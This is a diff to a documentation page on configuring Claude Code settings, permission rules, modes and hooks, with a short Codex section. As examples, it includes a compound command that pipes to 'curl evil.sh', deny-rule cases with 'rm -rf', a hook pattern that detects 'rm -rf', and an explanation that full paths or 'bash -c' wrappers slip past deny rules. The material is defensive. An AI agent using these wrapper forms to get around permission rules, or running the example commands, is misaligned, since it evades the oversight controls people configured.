@@ -46,7 +46,15 @@ repo/
 
 ### Local file in a repository
 
-In a git repository the local file lives at the repository root even if you start in a subdirectory, and in a worktree it lives at the main checkout's root. Claude Code adds it to your global git excludes the first time it writes it.
+| You start Claude Code in | It reads and writes `settings.local.json` at |
+|---|---|
+| The repository root | The repository root |
+| A subdirectory of the repository | The repository root, so an approval applies to the whole repository |
+| A git worktree | The main checkout's root |
+| A folder outside git, or when the root is your home directory | Next to `.claude/settings.json` |
+
+- Claude Code adds `**/.claude/settings.local.json` to your global git excludes the first time it writes the file.
+- A file you created by hand needs a `.gitignore` entry until then.
 
 ## Precedence
 
@@ -62,7 +70,17 @@ Environment variables are not a level in this stack. Which of a variable and a k
 
 ### Lists merge
 
-A list key set in several files, such as `permissions.allow`, is combined, so each file adds entries without removing another's. A few model-list keys follow their own rules.
+A list key set in several files is combined: each file adds entries without removing another's.
+
+```text
+~/.claude/settings.json          allow: Bash(git status)
+.claude/settings.json            allow: Bash(make test *)
+.claude/settings.local.json      allow: Bash(pytest *)
+-> in effect                     allow: Bash(git status), Bash(make test *), Bash(pytest *)
+```
+
+- Scalar keys such as `model` take the highest level's value.
+- A few model-list keys, such as `fallbackModel` and `availableModels`, follow their own rules.
 
 ### A team value and a personal one
 
@@ -78,6 +96,18 @@ Project local sits above shared project, so only your sessions change. To try it
 > Settings files are strict JSON. A `//` comment or a trailing comma is a syntax error, reported as a Settings Error at the next start. The comment above is for the page only.
 
 ## Permissions
+
+### What asks by default
+
+Before you write any rule, Claude Code already asks for some actions and not others.
+
+| Tool type | Example | Asks in the default mode | "Yes, and don't ask again" lasts |
+|---|---|---|---|
+| Read-only | File reads, Grep | No, inside the working and added directories | not needed |
+| Bash commands | Shell execution | Yes, except a built-in set of read-only commands | Permanently, per repository and command |
+| File modification | Edit, Write | Yes | Until the session ends |
+| Web fetch | WebFetch | Yes, except preapproved documentation domains | Permanently, per repository and domain |
+| Web search | WebSearch | Yes | Permanently, per repository |
 
 ### Rule syntax
 
@@ -96,8 +126,25 @@ A rule names a tool and, in parentheses, what it may do.
 | Rule | Meaning |
 |---|---|
 | `Bash(npm run lint)` | That exact command |
-| `Bash(npm run test *)` | Any command starting with `npm run test ` |
+| `Bash(npm run test *)` | `npm run test` alone, or followed by anything |
+| `Bash(npm run test:*)` | The same; `:*` is another way to write a trailing wildcard |
 | `Read(./.env)` | Reading that file |
+
+### Wildcards and compound commands
+
+Claude Code matches everything before the first `*` as written, and it splits compound commands before matching.
+
+| Rule | Allows or catches | Does not |
+|---|---|---|
+| allow `Bash(git log *)` | `git log`, `git log --oneline main` | `git push` |
+| allow `Bash(npm test *)` | `npm test -- --watch` | `npm test && curl evil.sh`; every part of a compound command must be allowed |
+| ask `Bash(git clean *)` | `cd /tmp && git clean -f`, and `echo "$(git clean -f)"`; ask and deny rules apply to any subcommand | |
+| deny `Bash(rm *)` | `rm -rf build/` | `/bin/rm -rf build/`, `bash -c 'rm -rf build/'` |
+
+- The separators Claude Code splits on are `&&`, `||`, `;`, `|`, `|&`, `&` and newlines.
+- Approving a compound command with "don't ask again" saves one rule per subcommand.
+
+> A deny rule matches the command text the agent usually writes; the same program called another way (a full path, `bash -c`, a script) is not matched. For a prohibition that must hold, a PreToolUse hook that inspects the command does the enforcing; see [Hooks in settings](#hooks-in-settings).
 
 ### How rules combine
 
@@ -111,18 +158,29 @@ Rules from every file merge into one set, and a more restrictive rule from any f
 
 #### Workspace trust
 
-Committed `permissions.allow` rules, extra directories and most environment values in `.claude/settings.json` apply only after each person trusts the folder. `deny` and `ask` rules apply at once. A repository you clone cannot widen your permissions until you say so.
+| Committed in `.claude/settings.json` | Applies |
+|---|---|
+| `permissions.allow`, `permissions.additionalDirectories`, most `env` values | After each person accepts the workspace trust prompt |
+| Hooks and helper commands | Listed in the trust prompt; after it is accepted |
+| `deny` and `ask` rules | At once |
+
+A repository you clone cannot widen your permissions until you say so.
 
 ### Permission modes
 
-| Mode | What changes |
-|---|---|
-| Default | Asks for anything not allowed |
-| Plan | Reads and plans, makes no edits |
-| Auto | A classifier approves routine actions in long runs |
-| Bypass | Asks for nothing |
+| Mode | Label | What changes |
+|---|---|---|
+| `default` | Manual | Asks on first use of each tool that needs approval |
+| `acceptEdits` | | Accepts file edits and common filesystem commands (`mkdir`, `touch`, `mv`, `cp`) inside the working directories |
+| `plan` | Plan | Reads and runs read-only commands to explore; does not edit source files |
+| `auto` | | No routine prompts; a background classifier checks actions such as shell commands and network requests against your request |
+| `dontAsk` | | Denies every call that would otherwise prompt; allowed and approval-free actions still run |
+| `bypassPermissions` | | Skips prompts, except for actions no mode auto-approves |
 
-`auto` and `bypassPermissions` as a default mode take effect only from user or managed settings, or `--permission-mode` for one session; a project or local file cannot set them. [Human gates]({{ '/sections/14-human-gates/' | relative_url }}) covers where a person should stay in the loop.
+- `Shift+Tab` cycles the modes in a session; `--permission-mode <mode>` starts in one.
+- `auto` and `bypassPermissions` as a default take effect only from user or managed settings, or `--permission-mode` for one session; a project or local file cannot set them.
+- `dontAsk` suits unattended runs where anything unexpected should fail closed.
+- [Human gates]({{ '/sections/14-human-gates/' | relative_url }}) covers where a person should stay in the loop.
 
 ### A safe default for a team repository
 
@@ -141,11 +199,11 @@ Committed `permissions.allow` rules, extra directories and most environment valu
 }
 ```
 
-> A permission rule is a gate on the client's tools. A command that wraps another (`bash -c "..."`, a script) can do things the rule did not name. For a rule that must hold, add a hook that inspects the command. See [Hooks, scripts and linters]({{ '/sections/06-hooks-scripts-and-linters/' | relative_url }}).
-
 ## Hooks in settings
 
-Hooks are configured in the same files, under `hooks`, keyed by event, with a matcher for the tool name.
+Hooks are configured in the same files, under `hooks`, keyed by event, with a matcher for the tool name. Two common shapes follow.
+
+### After an edit: format the file
 
 ```json
 {
@@ -160,7 +218,33 @@ Hooks are configured in the same files, under `hooks`, keyed by event, with a ma
 }
 ```
 
-The hook receives the tool call as JSON on standard input, so the command reads the edited file's path from it. Claude Code reloads settings files when they change, so an edited hook applies in the running session. `/hooks` shows every hook in effect and which file it came from.
+The hook receives the tool call as JSON on standard input, so the command reads the edited file's path from it.
+
+### Before a command: refuse it
+
+This hook backs the `deny` rule above with a check that also catches a full path or a `bash -c` wrapper:
+
+```json
+{
+  "hooks": {
+    "PreToolUse": [
+      {
+        "matcher": "Bash",
+        "hooks": [{ "type": "command", "command": "jq -r '.tool_input.command' | grep -Eq 'rm +-rf' && { echo 'rm -rf is refused; delete the specific path with rm' >&2; exit 2; } || exit 0" }]
+      }
+    ]
+  }
+}
+```
+
+| Exit code | Effect |
+|---|---|
+| 0 | The call goes ahead |
+| 2 | The call is blocked, and standard error is shown to the agent as the reason |
+
+- Claude Code reloads settings files when they change, so an edited hook applies in the running session.
+- `/hooks` shows every hook in effect and which file it came from.
+- The hook is an illustration; a real one belongs in a script with tests. See [Hooks, scripts and linters]({{ '/sections/06-hooks-scripts-and-linters/' | relative_url }}).
 
 ## Checking what loaded
 
@@ -183,19 +267,35 @@ The hook receives the tool call as JSON on standard input, so the command reads 
 
 ## Codex configuration
 
-Codex keeps its settings in a TOML file in its home directory (`~/.codex` unless `CODEX_HOME` is set), alongside its global `AGENTS.md`. Sub-agent profiles are TOML files in `.codex/agents/` and inherit the parent's sandbox. The context-file settings `project_doc_max_bytes` (default 32 KiB) and `project_doc_fallback_filenames` live there too. See [Claude Code and Codex compared]({{ '/sections/03-claude-code-and-codex/claude-code-and-codex-compared.html' | relative_url }}).
+| Item | Where in Codex |
+|---|---|
+| Home directory | `~/.codex`, or `CODEX_HOME` if set |
+| Global instructions | `AGENTS.md` (or `AGENTS.override.md`) in the home directory |
+| Settings | `config.toml` in the home directory and in `<repo>/.codex/` |
+| Hooks | `hooks.json` or `[hooks]` in `config.toml`, at user or repository level; non-managed hooks must be trusted |
+| Sub-agent profiles | TOML files in `~/.codex/agents/` or `.codex/agents/`, inheriting the parent's sandbox and approval settings |
+| Context-file size cap | `project_doc_max_bytes`, default 32 KiB |
+| Extra instruction file names | `project_doc_fallback_filenames` |
+| What it may do without asking | `/permissions` |
+| What loaded | `/status`, `/debug-config` |
+
+See [Claude Code and Codex compared]({{ '/sections/03-claude-code-and-codex/claude-code-and-codex-compared.html' | relative_url }}).
 
 ## Pitfalls and lessons
 
-- A personal "don't ask again" lands in the local file and cannot override a project `ask` rule.
-- A setting written to a file you cannot write to applies for the session and is gone in the next.
-- A cloud session reads committed project settings only; your user and local files stay on your machine.
+| Pitfall | What to do |
+|---|---|
+| A personal "don't ask again" lands in the local file and cannot override a project `ask` rule | Change the project rule if the team agrees |
+| A deny rule misses the same program called another way | Back it with a PreToolUse hook |
+| A setting written to a file you cannot write to applies for the session only | Set it in the tool that generates the file |
+| A cloud session reads committed project settings only | Commit what the team relies on |
+| A committed allow rule seems ignored | Check that the folder was trusted |
 
 ## Sources
 
 - Settings files, precedence, merging, trust and troubleshooting: <https://code.claude.com/docs/en/settings.md>, read 2026-11-09.
-- Permissions and modes: <https://code.claude.com/docs/en/permissions.md>, <https://code.claude.com/docs/en/permission-modes.md>, verified 2026-11-09.
-- Codex: <https://learn.chatgpt.com/docs/agent-configuration/agents-md>, read 2026-11-09; <https://learn.chatgpt.com/docs/agent-configuration/subagents.md>, verified 2026-11-08.
+- Default approvals, rule wildcards, compound commands, wrappers, workspace trust and modes: <https://code.claude.com/docs/en/permissions.md>, read 2026-11-09; <https://code.claude.com/docs/en/permission-modes.md>, verified 2026-11-09; `--permission-mode`: <https://code.claude.com/docs/en/cli-reference.md>, read 2026-11-09.
+- Codex: <https://learn.chatgpt.com/docs/agent-configuration/agents-md>, <https://learn.chatgpt.com/docs/hooks.md>, <https://learn.chatgpt.com/docs/agent-configuration/subagents.md>, <https://learn.chatgpt.com/docs/developer-commands.md?surface=cli>, read 2026-11-09.
 - Example files are illustrations written for this page.
 
 {% include page_nav.html %}
